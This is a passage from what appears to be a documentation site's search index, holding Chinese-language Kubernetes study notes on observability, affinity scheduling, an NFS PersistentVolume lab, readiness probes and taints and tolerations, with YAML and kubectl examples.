\u5982\u5bb9\u5668\u5f02\u5e38\u91cd\u542f\u62a5\u8b66\uff0c\u53ef\u53ca\u65f6\u901a\u8fc7\u963f\u91ccACK\u4e8b\u4ef6\u754c\u9762\u67e5\u770b\u91cd\u542f\u539f\u56e0\uff08\u4e8b\u4ef6\u9ed8\u8ba4\u4fdd\u7559\u4e00\u4e2a\u5c0f\u65f6\uff09\uff0cprometheus\u76d1\u63a7\u67e5\u770bcpu\u3001mem\u3001net\u3001fs\u8bfb\u5199\u72b6\u51b5\uff0c\u963f\u91ccARMS\u67e5\u770bjvm\u4ee5\u53ca\u94fe\u8def\u72b6\u6001\u7b49\u8bf7\u6c42\u60c5\u51b5\uff0c\u4ee5\u53ca\u963f\u91ccsls \u65e5\u5fd7\u670d\u52a1\u67e5\u770b\u91cd\u542f\u65f6\u95f4\u70b9\u4e1a\u52a1\u65e5\u5fd7\u8be6\u7ec6\u4fe1\u606f\u6765\u6392\u67e5\u3002","title":"\u539f\u52197\uff1a\u53ef\u89c2\u6d4b\u6027"},{"location":"lxc/kubernetes/principle/#8","text":"\u5728\u9ed8\u8ba4\u7684K8S\u8c03\u5ea6\u4e2d\uff0c\u4e00\u822c\u7ecf\u8fc7\u9884\u9009\u548c\u4f18\u9009\u5373\u53ef\u5b8c\u6210\u8c03\u5ea6\uff0c\u4f46\u662f\u751f\u4ea7\u7684\u5b9e\u9645\u4f7f\u7528\u4e2d\uff0c\u8003\u8651\u5230\u90e8\u5206\u4e1a\u52a1\u7684\u7279\u6b8a\u6027\uff0c\u4e00\u822c\u4f1a\u624b\u52a8\u8fdb\u884c\u4e00\u4e9b\"\u6307\u5b9a\"\uff0c K8S \u628a\u8fd9\u4e9b\"\u6307\u5b9a\"\u5206\u4e3anodeAffinity(\u8282\u70b9\u4eb2\u548c\u6027)\u3001podAffinity(pod \u4eb2\u548c\u6027) \u4ee5\u53ca podAntiAffinity(pod \u53cd\u4eb2\u548c\u6027), \u8fd9\u5728\u8c03\u5ea6\u8fc7\u7a0b\u4e2d\uff0c\u79f0\u4e4b\u4e3a\u4eb2\u548c\u6027\u8c03\u5ea6\uff0c\u4eb2\u548c\u6027\u8c03\u5ea6\u53ef\u4ee5\u5206\u6210\u8f6f\u7b56\u7565(preferredDuringSchedulingIgnoredDuringExecution )\u548c\u786c\u7b56\u7565 (requiredDuringSchedulingIgnoredDuringExecution)\u4e24\u79cd\u65b9\u5f0f\uff0c\u8f6f\u7b56\u7565\u610f\u601d\u662f\u5982\u679c\u73b0\u5728\u6ca1\u6709\u6ee1\u8db3\u8c03\u5ea6\u8981\u6c42\u8981\u6c42\u7684\u8bdd\uff0c\u90a3\u5c31\u8df3\u8fc7\u8fd9\u6761\u7b56\u7565\uff0c\u7ee7\u7eed\u8c03\u5ea6\uff0c\u603b\u7ed3\u8d77\u6765\u5c31\u662f\"\u6709\u5219\u7528\u4e4b\uff0c\u65e0\u5219\u8df3\u8fc7\", \u800c\u786c\u7b56\u7565\u76f8\u5bf9\u5c31\u5f3a\u786c\u5f88\u591a\uff0c\u5982\u679c\u4e0d\u6ee1\u8db3\u8c03\u5ea6\u7b56\u7565\uff0c\u5219\u4e0d\u505c\u91cd\u8bd5\uff0c\u76f4\u5230\u6ee1\u8db3\u7b56\u7565\u3002Pod \u62d3\u6251\u4f20\u64ad\u7ea6\u675f\u4ee5\u53ca\u4eb2\u548c\u6027\u548c\u53cd\u4eb2\u548c\u6027\u89c4\u5219\u53ef\u4ee5\u505a\u5230\u5c06 Pod \u653e\u5728\u4e00\u8d77\uff08\u4ee5\u63d0\u9ad8\u7f51\u7edc\u6d41\u91cf\u6548\u7387\uff09\u6216\u5c06\u5b83\u4eec\u5206\u6563\uff08\u4ee5\u5b9e\u73b0\u5197\u4f59\uff09\u4fdd\u8bc1\u53ef\u7528\u6027\u3002 \u4eb2\u548c\u6027\u548c\u53cd\u4eb2\u548c\u6027\u7684\u4f5c\u7528\u662f\u4e3a\u4e86\u8ba9pod\u53ef\u4ee5\u6839\u636e\u9700\u8981\u8c03\u5ea6\u5230\u81ea\u5df1\u60f3\u5206\u914d\u7684\u4e00\u4e2a\u6216\u8005\u4e00\u7ec4node\u4e0a\uff0c\u6c61\u70b9\u7684\u4f5c\u7528\u5176\u5b9e\u5c31\u662f\u53cd\u8fc7\u6765\uff0c\u5c31\u662f\u7ed9node\u6253\u4e0a\u4e00\u4e2a\u7279\u6b8a\u7684\u6807\u7b7e\uff0c\u8ba9\u8be5node\u4e0d\u518d\u88ab\u5206\u914dpod\uff0c\u9664\u975e\u8be5pod\u5bb9\u5fcd\u4e86\u8be5\u6c61\u70b9\u3002","title":"\u539f\u52198\uff1a\u5bb9\u5668\u8c03\u5ea6"},{"location":"lxc/kubernetes/pvc%E5%AE%9E%E9%AA%8C/","text":"NFS\u4f5c\u4e3aPV\u6765\u6f14\u793a nfs\u670d\u52a1\u5668 yum install -y nfs-common nfs-utils rpcbind mkdir /nfsdata chmod 666 /nfsdata cat /etc/exports /nfsdata *(rw,no_root_squash,no_all_squash,sync) systemctl start rpcbind systemctl start nfs \u90e8\u7f72PV apiVersion: v1 kind: PersistentVolume metadata: name: nfspv spec: capacity: storage: 1Gi accessModes: - ReadWriteOnce persistentVolumeReclaimPolicy: Recycle storageClassName: nfs nfs: path: /nfsdata server:1.1.1.1 \u521b\u5efa\u670d\u52a1 apiVersion: v1 kind: Service metadata: name: nginx labels: app: nginx spec: ports: - port: 80 name: web clusterIP: None selector: app: nginx \u521b\u5efaStatefulSet apiVersion: apps/v1 kind: StatefulSet metadata: name: web spec: selector: matchLabels: app: nginx serviceName: \"nginx\" replicas: 3 template: metadata: labels: app: nginx spec: containers: - name: nginx image: k8s.gcr.io/nginx-slim:0.8 ports: - containerPort: 80 name: web volumeMounts: - name: www mountPath: /usr/share/nginx/html volumeClaimTemplates: - metadata: name: www spec: accessModes: [ \"ReadWriteOnce\" ] storageClassName: \"nfs\" resources: requests: storage: 1Gi","title":"pvc\u5b9e\u9a8c"},{"location":"lxc/kubernetes/readiness/","text":"Readiness \u7528\u6237\u901a\u8fc7Liveness\u63a2\u6d4b\u53ef\u4ee5\u544a\u8bc9Kubernetes\u4ec0\u4e48\u65f6\u5019\u901a\u8fc7\u91cd\u542f\u5bb9\u5668\u5b9e\u73b0\u81ea\u6108\uff1bReadiness\u63a2\u6d4b\u5219\u662f\u544a\u8bc9Kubernetes\u4ec0\u4e48\u65f6\u5019\u53ef\u4ee5\u5c06\u5bb9\u5668\u52a0\u5165\u5230Service\u8d1f\u8f7d\u5747\u8861\u6c60\u4e2d\uff0c\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\u3002 apiVersion: v1 kind: Pod metadata: labels: test: readiness name: readiness spec: restartPolicy: OnFailure containers: - name: readiness image: busybox args: - /bin/sh - -c - touch /tmp/healthy; sleep 30; rm -rf /tmp/healthy; sleep 600 readinessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 10 periodSeconds: 5 \u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u53ea\u662f\u5c06\u524d\u9762\u4f8b\u5b50\u4e2d\u7684 liveness \u66ff\u6362\u4e3a\u4e86 readiness\uff0c\u6211\u4eec\u770b\u770b\u6709\u4ec0\u4e48\u4e0d\u540c\u7684\u6548\u679c\u3002 Pod readiness \u7684 READY \u72b6\u6001\u7ecf\u5386\u4e86\u5982\u4e0b\u53d8\u5316\uff1a 1. \u521a\u88ab\u521b\u5efa\u65f6\uff0cREADY \u72b6\u6001\u4e3a\u4e0d\u53ef\u7528\u3002 15 \u79d2\u540e\uff08initialDelaySeconds + periodSeconds\uff09\uff0c\u7b2c\u4e00\u6b21\u8fdb\u884c Readiness \u63a2\u6d4b\u5e76\u6210\u529f\u8fd4\u56de\uff0c\u8bbe\u7f6e READY \u4e3a\u53ef\u7528\u3002 30 \u79d2\u540e\uff0c/tmp/healthy \u88ab\u5220\u9664\uff0c\u8fde\u7eed 3 \u6b21 Readiness \u63a2\u6d4b\u5747\u5931\u8d25\u540e\uff0cREADY \u88ab\u8bbe\u7f6e\u4e3a\u4e0d\u53ef\u7528\u3002 \u901a\u8fc7 kubectl describe pod readiness \u4e5f\u53ef\u4ee5\u770b\u5230 Readiness \u63a2\u6d4b\u5931\u8d25\u7684\u65e5\u5fd7\u3002 \u4e0b\u9762\u5bf9 Liveness \u63a2\u6d4b\u548c Readiness \u63a2\u6d4b\u505a\u4e2a\u6bd4\u8f83\uff1a 1. Liveness \u63a2\u6d4b\u548c Readiness \u63a2\u6d4b\u662f\u4e24\u79cd Health Check \u673a\u5236\uff0c\u5982\u679c\u4e0d\u7279\u610f\u914d\u7f6e\uff0cKubernetes \u5c06\u5bf9\u4e24\u79cd\u63a2\u6d4b\u91c7\u53d6\u76f8\u540c\u7684\u9ed8\u8ba4\u884c\u4e3a\uff0c\u5373\u901a\u8fc7\u5224\u65ad\u5bb9\u5668\u542f\u52a8\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c\u662f\u5426\u4e3a\u96f6\u6765\u5224\u65ad\u63a2\u6d4b\u662f\u5426\u6210\u529f\u3002 \u4e24\u79cd\u63a2\u6d4b\u7684\u914d\u7f6e\u65b9\u6cd5\u5b8c\u5168\u4e00\u6837\uff0c\u652f\u6301\u7684\u914d\u7f6e\u53c2\u6570\u4e5f\u4e00\u6837\u3002\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u63a2\u6d4b\u5931\u8d25\u540e\u7684\u884c\u4e3a\uff1aLiveness \u63a2\u6d4b\u662f\u91cd\u542f\u5bb9\u5668\uff1bReadiness \u63a2\u6d4b\u5219\u662f\u5c06\u5bb9\u5668\u8bbe\u7f6e\u4e3a\u4e0d\u53ef\u7528\uff0c\u4e0d\u63a5\u6536 Service \u8f6c\u53d1\u7684\u8bf7\u6c42\u3002 Liveness \u63a2\u6d4b\u548c Readiness \u63a2\u6d4b\u662f\u72ec\u7acb\u6267\u884c\u7684\uff0c\u4e8c\u8005\u4e4b\u95f4\u6ca1\u6709\u4f9d\u8d56\uff0c\u6240\u4ee5\u53ef\u4ee5\u5355\u72ec\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u540c\u65f6\u4f7f\u7528\u3002\u7528 Liveness \u63a2\u6d4b\u5224\u65ad\u5bb9\u5668\u662f\u5426\u9700\u8981\u91cd\u542f\u4ee5\u5b9e\u73b0\u81ea\u6108\uff1b\u7528 Readiness \u63a2\u6d4b\u5224\u65ad\u5bb9\u5668\u662f\u5426\u5df2\u7ecf\u51c6\u5907\u597d\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\u3002 \u963f\u91cc\u4e91\u5bf9\u5e94\u7684\u4f4d\u7f6e\uff1a","title":"readiness"},{"location":"lxc/kubernetes/readiness/#readiness","text":"\u7528\u6237\u901a\u8fc7Liveness\u63a2\u6d4b\u53ef\u4ee5\u544a\u8bc9Kubernetes\u4ec0\u4e48\u65f6\u5019\u901a\u8fc7\u91cd\u542f\u5bb9\u5668\u5b9e\u73b0\u81ea\u6108\uff1bReadiness\u63a2\u6d4b\u5219\u662f\u544a\u8bc9Kubernetes\u4ec0\u4e48\u65f6\u5019\u53ef\u4ee5\u5c06\u5bb9\u5668\u52a0\u5165\u5230Service\u8d1f\u8f7d\u5747\u8861\u6c60\u4e2d\uff0c\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\u3002 apiVersion: v1 kind: Pod metadata: labels: test: readiness name: readiness spec: restartPolicy: OnFailure containers: - name: readiness image: busybox args: - /bin/sh - -c - touch /tmp/healthy; sleep 30; rm -rf /tmp/healthy; sleep 600 readinessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 10 periodSeconds: 5 \u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u53ea\u662f\u5c06\u524d\u9762\u4f8b\u5b50\u4e2d\u7684 liveness \u66ff\u6362\u4e3a\u4e86 readiness\uff0c\u6211\u4eec\u770b\u770b\u6709\u4ec0\u4e48\u4e0d\u540c\u7684\u6548\u679c\u3002 Pod readiness \u7684 READY \u72b6\u6001\u7ecf\u5386\u4e86\u5982\u4e0b\u53d8\u5316\uff1a 1. \u521a\u88ab\u521b\u5efa\u65f6\uff0cREADY \u72b6\u6001\u4e3a\u4e0d\u53ef\u7528\u3002 15 \u79d2\u540e\uff08initialDelaySeconds + periodSeconds\uff09\uff0c\u7b2c\u4e00\u6b21\u8fdb\u884c Readiness \u63a2\u6d4b\u5e76\u6210\u529f\u8fd4\u56de\uff0c\u8bbe\u7f6e READY \u4e3a\u53ef\u7528\u3002 30 \u79d2\u540e\uff0c/tmp/healthy \u88ab\u5220\u9664\uff0c\u8fde\u7eed 3 \u6b21 Readiness \u63a2\u6d4b\u5747\u5931\u8d25\u540e\uff0cREADY \u88ab\u8bbe\u7f6e\u4e3a\u4e0d\u53ef\u7528\u3002 \u901a\u8fc7 kubectl describe pod readiness \u4e5f\u53ef\u4ee5\u770b\u5230 Readiness \u63a2\u6d4b\u5931\u8d25\u7684\u65e5\u5fd7\u3002 \u4e0b\u9762\u5bf9 Liveness \u63a2\u6d4b\u548c Readiness \u63a2\u6d4b\u505a\u4e2a\u6bd4\u8f83\uff1a 1. Liveness \u63a2\u6d4b\u548c Readiness \u63a2\u6d4b\u662f\u4e24\u79cd Health Check \u673a\u5236\uff0c\u5982\u679c\u4e0d\u7279\u610f\u914d\u7f6e\uff0cKubernetes \u5c06\u5bf9\u4e24\u79cd\u63a2\u6d4b\u91c7\u53d6\u76f8\u540c\u7684\u9ed8\u8ba4\u884c\u4e3a\uff0c\u5373\u901a\u8fc7\u5224\u65ad\u5bb9\u5668\u542f\u52a8\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c\u662f\u5426\u4e3a\u96f6\u6765\u5224\u65ad\u63a2\u6d4b\u662f\u5426\u6210\u529f\u3002 \u4e24\u79cd\u63a2\u6d4b\u7684\u914d\u7f6e\u65b9\u6cd5\u5b8c\u5168\u4e00\u6837\uff0c\u652f\u6301\u7684\u914d\u7f6e\u53c2\u6570\u4e5f\u4e00\u6837\u3002\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u63a2\u6d4b\u5931\u8d25\u540e\u7684\u884c\u4e3a\uff1aLiveness \u63a2\u6d4b\u662f\u91cd\u542f\u5bb9\u5668\uff1bReadiness \u63a2\u6d4b\u5219\u662f\u5c06\u5bb9\u5668\u8bbe\u7f6e\u4e3a\u4e0d\u53ef\u7528\uff0c\u4e0d\u63a5\u6536 Service \u8f6c\u53d1\u7684\u8bf7\u6c42\u3002 Liveness \u63a2\u6d4b\u548c Readiness \u63a2\u6d4b\u662f\u72ec\u7acb\u6267\u884c\u7684\uff0c\u4e8c\u8005\u4e4b\u95f4\u6ca1\u6709\u4f9d\u8d56\uff0c\u6240\u4ee5\u53ef\u4ee5\u5355\u72ec\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u540c\u65f6\u4f7f\u7528\u3002\u7528 Liveness \u63a2\u6d4b\u5224\u65ad\u5bb9\u5668\u662f\u5426\u9700\u8981\u91cd\u542f\u4ee5\u5b9e\u73b0\u81ea\u6108\uff1b\u7528 Readiness \u63a2\u6d4b\u5224\u65ad\u5bb9\u5668\u662f\u5426\u5df2\u7ecf\u51c6\u5907\u597d\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\u3002 \u963f\u91cc\u4e91\u5bf9\u5e94\u7684\u4f4d\u7f6e\uff1a","title":"Readiness"},{"location":"lxc/kubernetes/stain/","text":"\u6c61\u70b9\u548c\u5bb9\u5fcd \u6c61\u70b9\u548c\u5bb9\u5fcd\uff08taints and tolerations\uff09\u6210\u5bf9\u5de5\u4f5c\uff0c\u4ee5\u786e\u4fdd Pod \u4e0d\u4f1a\u88ab\u8c03\u5ea6\u5230\u4e0d\u5408\u9002\u7684\u8282\u70b9\u4e0a\u3002 \u53ef\u4ee5\u4e3a\u8282\u70b9\u589e\u52a0\u6c61\u70b9\uff08taints\uff0c\u4e00\u4e2a\u8282\u70b9\u53ef\u4ee5\u6709 0-N \u4e2a\u6c61\u70b9\uff09 \u53ef\u4ee5\u4e3a Pod \u589e\u52a0\u5bb9\u5fcd\uff08toleration\uff0c\u4e00\u4e2a Pod \u53ef\u4ee5\u6709 0-N \u4e2a\u5bb9\u5fcd\uff09 \u5982\u679c\u8282\u70b9\u4e0a\u5b58\u5728\u6c61\u70b9\uff0c\u5219\u8be5\u8282\u70b9\u4e0d\u4f1a\u63a5\u53d7\u4efb\u4f55\u4e0d\u80fd\u5bb9\u5fcd\uff08tolerate\uff09\u8be5\u6c61\u70b9\u7684 Pod\u3002 \u5411\u8282\u70b9\u6dfb\u52a0\u6c61\u70b9 \u6267\u884c kubectl taint \u547d\u4ee4\uff0c\u53ef\u5411\u8282\u70b9\u6dfb\u52a0\u6c61\u70b9\uff0c\u5982\u4e0b\u6240\u793a\uff1a kubectl taint nodes node1 key=value:NoSchedule \u8be5\u547d\u4ee4\u4e3a\u8282\u70b9 node1 \u6dfb\u52a0\u4e86\u4e00\u4e2a\u6c61\u70b9\u3002\u6c61\u70b9\u662f\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u5728\u672c\u4f8b\u4e2d\uff0c\u6c61\u70b9\u7684\u952e\u4e3a key \uff0c\u503c\u4e3a value \uff0c\u6c61\u70b9\u6548\u679c\u4e3a NoSchedule \u3002\u6b64\u6c61\u70b9\u610f\u5473\u7740 Kubernetes \u4e0d\u4f1a\u5411\u8be5\u8282\u70b9\u8c03\u5ea6\u4efb\u4f55 Pod\uff0c\u9664\u975e\u8be5 Pod \u6709\u4e00\u4e2a\u5339\u914d\u7684\u5bb9\u5fcd\uff08toleration\uff09 \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u53ef\u4ee5\u5c06\u672c\u4f8b\u4e2d\u7684\u6c61\u70b9\u79fb\u9664\uff1a kubectl taint nodes node1 key:NoSchedule- \u8bbe\u7f6e\u6c61\u70b9\uff1a kubectl taint node [node] key=value[effect] \u5176\u4e2d[effect] \u53ef\u53d6\u503c\uff1a [ NoSchedule | PreferNoSchedule | NoExecute ] NoSchedule \uff1a\u4e00\u5b9a\u4e0d\u80fd\u88ab\u8c03\u5ea6\u3002 PreferNoSchedule\uff1a\u5c3d\u91cf\u4e0d\u8981\u8c03\u5ea6\u3002 NoExecute\uff1a\u4e0d\u4ec5\u4e0d\u4f1a\u8c03\u5ea6\uff0c\u8fd8\u4f1a\u9a71\u9010Node\u4e0a\u5df2\u6709\u7684Pod\u3002 #\u793a\u4f8b\uff1a kubectl taint node 10.3.1.16 test=16:NoSchedule \u53bb\u9664\u6c61\u70b9\uff1a #\u6bd4\u5982\u8bbe\u7f6e\u6c61\u70b9\uff1a kubectl taint node 10.3.1.16 test=16:NoSchedule kubectl taint node 10.3.1.16 test=16:NoExecute #\u53bb\u9664\u6307\u5b9akey\u53ca\u5176effect\uff1a kubectl taint nodes node_name key:[effect]- #(\u8fd9\u91cc\u7684key\u4e0d\u7528\u6307\u5b9avalue) #\u53bb\u9664\u6307\u5b9akey\u6240\u6709\u7684effect: kubectl taint nodes node_name key- #\u793a\u4f8b\uff1a kubectl taint node 10.3.1.16 test:NoSchedule- kubectl taint node 10.3.1.16 test:NoExecute- kubectl taint node 10.3.1.16 test- \u5411 Pod \u6dfb\u52a0\u5bb9\u5fcd PodSpec \u4e2d\u6709\u4e00\u4e2a tolerations \u5b57\u6bb5\uff0c\u53ef\u7528\u4e8e\u5411 Pod \u6dfb\u52a0\u5bb9\u5fcd\u3002\u4e0b\u9762\u7684\u4e24\u4e2a\u4f8b\u5b50\u4e2d\u5b9a\u4e49\u7684\u5bb9\u5fcd\u90fd\u53ef\u4ee5\u5339\u914d\u4e0a\u4f8b\u4e2d\u7684\u6c61\u70b9\uff0c\u5305\u542b\u8fd9\u4e9b\u5bb9\u5fcd\u7684 Pod \u4e5f\u90fd\u53ef\u4ee5\u88ab\u8c03\u5ea6\u5230 node1 \u8282\u70b9\u4e0a\uff1a \u5bb9\u5fcd1\uff1a tolerations: - key: \"key\" operator: \"Equal\" value: \"value\" effect: \"NoSchedule\" \u5bb9\u5fcd2\uff1a tolerations: - key: \"key\" operator: \"Exists\" effect: \"NoSchedule\" \u4e0b\u9762\u8fd9\u4e2a Pod \u7684\u4f8b\u5b50\u4e2d\uff0c\u4f7f\u7528\u4e86\u5bb9\u5fcd\uff1a apiVersion: v1 kind: Pod metadata: name: nginx labels: env: test spec: containers: - name: nginx image: nginx imagePullPolicy: IfNotPresent tolerations: - key: \"example-key\" operator: \"Exists\" effect: \"NoSchedule\" \u6c61\u70b9\u4e0e\u5bb9\u5fcd\u7684\u5339\u914d \u5f53\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\u65f6\uff0cKubernetes \u8ba4\u4e3a\u5bb9\u5fcd\u548c\u6c61\u70b9\u5339\u914d\uff1a \u952e\uff08key\uff09\u76f8\u540c \u6548\u679c\uff08effect\uff09\u76f8\u540c \u6c61\u70b9\u7684 operator \u4e3a\uff1a Exists \uff08\u6b64\u65f6\u6c61\u70b9\u4e2d\u4e0d\u5e94\u8be5\u6307\u5b9a value \uff09 \u6216\u8005 Equal \uff08\u6b64\u65f6\u5bb9\u5fcd\u7684 value \u5e94\u4e0e\u6c61\u70b9\u7684 value \u76f8\u540c\uff09 \u5982\u679c\u4e0d\u6307\u5b9a operator \uff0c\u5219\u5176\u9ed8\u8ba4\u4e3a Equal \u7279\u6b8a\u60c5\u51b5 \u5b58\u5728\u5982\u4e0b\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\uff1a \u5bb9\u5fcd\u4e2d\u672a\u5b9a\u4e49 key \u4f46\u662f\u5b9a\u4e49\u4e86 operator \u4e3a Exists \uff0cKubernetes \u8ba4\u4e3a\u6b64\u5bb9\u5fcd\u5339\u914d\u6240\u6709\u7684\u6c61\u70b9\uff0c\u5982\u4e0b\u6240\u793a\uff1a tolerations: - operator: \"Exists\" \u5bb9\u5fcd\u4e2d\u672a\u5b9a\u4e49 effect \u4f46\u662f\u5b9a\u4e49\u4e86 key \uff0cKubernetes \u8ba4\u4e3a\u6b64\u5bb9\u5fcd\u5339\u914d\u6240\u6709 effect \uff0c\u5982\u4e0b\u6240\u793a\uff1a tolerations: - key: \"key\" operator: \"Exists\" \u4e00\u4e2a\u8282\u70b9\u4e0a\u53ef\u4ee5\u6709\u591a\u4e2a\u6c61\u70b9\uff0c\u540c\u65f6\u4e00\u4e2a Pod \u4e0a\u53ef\u4ee5\u6709\u591a\u4e2a\u5bb9\u5fcd\u3002Kubernetes \u4f7f\u7528\u4e00\u79cd\u7c7b\u4f3c\u4e8e\u8fc7\u6ee4\u5668\u7684\u65b9\u6cd5\u6765\u5904\u7406\u591a\u4e2a\u8282\u70b9\u548c\u5bb9\u5fcd\uff1a \u5bf9\u4e8e\u8282\u70b9\u7684\u6240\u6709\u6c61\u70b9\uff0c\u68c0\u67e5 Pod \u4e0a\u662f\u5426\u6709\u5339\u914d\u7684\u5bb9\u5fcd\uff0c\u5982\u679c\u5b58\u5728\u5339\u914d\u7684\u5bb9\u5fcd\uff0c\u5219\u5ffd\u7565\u8be5\u6c61\u70b9\uff1b \u5269\u4e0b\u7684\u4e0d\u53ef\u5ffd\u7565\u7684\u6c61\u70b9\u5c06\u5bf9\u8be5 Pod \u8d77\u4f5c\u7528 \u4f8b\u5982\uff1a \u5982\u679c\u5b58\u5728\u81f3\u5c11\u4e00\u4e2a\u4e0d\u53ef\u5ffd\u7565\u7684\u6c61\u70b9\u5e26\u6709\u6548\u679c NoSchedule \uff0c\u5219 Kubernetes \u4e0d\u4f1a\u5c06 Pod \u8c03\u5ea6\u5230\u8be5\u8282\u70b9\u4e0a \u5982\u679c\u6ca1\u6709\u4e0d\u53ef\u5ffd\u7565\u7684\u6c61\u70b9\u5e26\u6709\u6548\u679c NoSchedule \uff0c\u4f46\u662f\u81f3\u5c11\u5b58\u5728\u4e00\u4e2a\u4e0d\u53ef\u5ffd\u7565\u7684\u6c61\u70b9\u5e26\u6709\u6548\u679c PreferNoSchedule \uff0c\u5219 Kubernetes \u5c06\u5c3d\u91cf\u907f\u514d\u5c06\u8be5 Pod \u8c03\u5ea6\u5230\u6b64\u8282\u70b9 \u5982\u679c\u5b58\u5728\u81f3\u5c11\u4e00\u4e2a\u5ffd\u7565\u7684\u6c61\u70b9\u5e26\u6709\u6548\u679c NoExecute \uff0c\u5219\uff1a \u5047\u8bbe Pod \u5df2\u7ecf\u5728\u8be5\u8282\u70b9\u4e0a\u8fd0\u884c\uff0cKubernetes \u5c06\u4ece\u8be5\u8282\u70b9\u4e0a\u9a71\u9010\uff08evict\uff09\u8be5 Pod \u5047\u8bbe Pod \u5c1a\u672a\u5728\u8be5\u8282\u70b9\u4e0a\u8fd0\u884c\uff0cKubernetes \u5c06\u4e0d\u4f1a\u628a Pod \u8c03\u5ea6\u5230\u8be5\u8282\u70b9 \u4f8b\u5982\uff0c\u5047\u8bbe\u60a8\u7ed9\u4e00\u4e2a\u8282\u70b9\u6dfb\u52a0\u4e86\u4e09\u4e2a\u6c61\u70b9\uff1a kubectl taint nodes node1 key1=value1:NoSchedule kubectl taint nodes node1 key1=value1:NoExecute kubectl taint nodes node1 key2=value2:NoSchedule \u540c\u65f6\uff0c\u6709\u4e00\u4e2a Pod \u5e26\u6709\u4e24\u4e2a\u5bb9\u5fcd\uff1a tolerations: - key: \"key1\" operator: \"Equal\" value: \"value1\" effect: \"NoSchedule\" - key: \"key1\" operator: \"Equal\" value: \"value1\" effect: \"NoExecute\" \u5728\u8fd9\u4e2a\u6848\u4f8b\u4e2d\uff0cPod \u4e0a\u6709\u4e24\u4e2a\u5bb9\u5fcd\uff0c\u5339\u914d\u4e86\u8282\u70b9\u7684\u524d\u4e24\u4e2a\u6c61\u70b9\uff0c\u53ea\u6709\u8282\u70b9\u7684\u7b2c\u4e09\u4e2a\u6c61\u70b9\u5bf9\u8be5 Pod \u6765\u8bf4\u4e0d\u53ef\u5ffd\u7565\uff0c\u8be5\u6c61\u70b9\u7684\u6548\u679c\u4e3a NoSchedule \uff1a Kubernetes \u4e0d\u4f1a\u5c06\u6b64 Pod \u8c03\u5ea6\u5230\u8be5\u8282\u70b9\u4e0a \u5982\u679c Kubernetes \u5148\u5c06 Pod \u8c03\u5ea6\u5230\u4e86\u8be5\u8282\u70b9\uff0c\u540e\u5411\u8be5\u8282\u70b9\u6dfb\u52a0\u4e86\u7b2c\u4e09\u4e2a\u6c61\u70b9\uff0c\u5219 Pod \u5c06\u7ee7\u7eed\u5728\u8be5\u8282\u70b9\u4e0a\u8fd0\u884c\u800c\u4e0d\u4f1a\u88ab\u9a71\u9010\uff08\u8282\u70b9\u4e0a\u5e26\u6709 NoExecute \u6548\u679c\u7684\u6c61\u70b9\u5df2\u88ab Pod \u4e0a\u7684\u7b2c\u4e8c\u4e2a\u5bb9\u5fcd\u5339\u914d\uff0c\u56e0\u6b64\u88ab\u5ffd\u7565\uff09 \u901a\u5e38\uff0c\u5728\u5e26\u6709\u6548\u679c NoExecute \u7684\u6c61\u70b9\u88ab\u6dfb\u52a0\u5230\u8282\u70b9\u65f6\uff0c\u8282\u70b9\u4e0a\u4efb\u4f55\u4e0d\u5bb9\u5fcd\u8be5\u6c61\u70b9\u7684 Pod \u5c06\u88ab\u7acb\u523b\u9a71\u9010\uff0c\u800c\u5bb9\u5fcd\u8be5\u6c61\u70b9\u7684 Pod \u5219\u4e0d\u4f1a\u88ab\u9a71\u9010\u3002 \u6b64\u5916\uff0c\u5e26\u6709\u6548\u679c NoExecute \u7684\u6c61\u70b9\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u53ef\u9009\u5b57\u6bb5 tolerationSeconds \uff0c\u8be5\u5b57\u6bb5\u6307\u5b9a\u4e86 Pod \u5728\u591a\u957f\u65f6\u95f4\u540e\u88ab\u9a71\u9010\uff0c\u4f8b\u5982\uff1a tolerations: - key: \"key1\" operator: \"Equal\" value: \"value1\" effect: \"NoExecute\" tolerationSeconds: 3600 \u6b64\u4f8b\u5b50\u4e2d\uff0c\u5982\u679c Pod \u5df2\u7ecf\u8fd0\u884c\u5728\u8282\u70b9\u4e0a\uff0c\u518d\u5411\u8282\u70b9\u589e\u52a0\u6b64\u6c61\u70b9\u65f6\uff0cPod \u5c06\u5728\u8be5\u8282\u70b9\u4e0a\u7ee7\u7eed\u8fd0\u884c 3600 \u79d2\uff0c\u7136\u540e\u624d\u88ab\u9a71\u9010\u3002\u5982\u679c\u6c61\u70b9\u5728\u6b64\u4e4b\u95f4\u88ab\u79fb\u9664\uff0c\u5219 Pod \u5c06\u4e0d\u4f1a\u88ab\u9a71\u9010\u3002","title":"\u6c61\u70b9"},{"location":"lxc/kubernetes/stain/#_1","text":"\u6c61\u70b9\u548c\u5bb9\u5fcd\uff08taints and tolerations\uff09\u6210\u5bf9\u5de5\u4f5c\uff0c\u4ee5\u786e\u4fdd Pod \u4e0d\u4f1a\u88ab\u8c03\u5ea6\u5230\u4e0d\u5408\u9002\u7684\u8282\u70b9\u4e0a\u3002 \u53ef\u4ee5\u4e3a\u8282\u70b9\u589e\u52a0\u6c61\u70b9\uff08taints\uff0c\u4e00\u4e2a\u8282\u70b9\u53ef\u4ee5\u6709 0-N \u4e2a\u6c61\u70b9\uff09 \u53ef\u4ee5\u4e3a Pod \u589e\u52a0\u5bb9\u5fcd\uff08toleration\uff0c\u4e00\u4e2a Pod \u53ef\u4ee5\u6709 0-N \u4e2a\u5bb9\u5fcd\uff09 